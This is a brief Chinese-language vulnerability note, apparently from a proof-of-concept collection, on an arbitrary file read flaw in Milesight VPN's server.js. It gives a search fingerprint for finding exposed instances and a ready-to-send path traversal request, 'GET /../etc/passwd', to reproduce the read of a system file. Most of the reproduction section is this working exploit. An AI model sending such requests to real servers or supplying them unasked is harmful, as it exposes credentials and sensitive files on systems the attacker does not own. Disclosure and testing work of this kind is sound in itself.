# Milesight VPN server.js 任意文件读取漏洞

## 漏洞描述

MilesightVPN 是一款软件，可使 Milesight 产品的 VPN 通道设置过程更加简便，并可通过网络服务器界面监控连接状态。其中存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中敏感文件

## 漏洞影响

<a-checkbox checked>Milesight VPN</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"MilesightVPN"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1690730120459-2c1711c9-5ccc-4cbc-a31e-b150b491eece-20230811182007783.png)

验证POC

```http
GET /../etc/passwd HTTP/1.1
Host: 
Accept: */*
Content-Type: application/x-www-form-urlencoded
```

![img](../../../.vuepress/public/img/1690730307132-26f4e9a2-dc98-4313-b836-e923f29be8f7.png)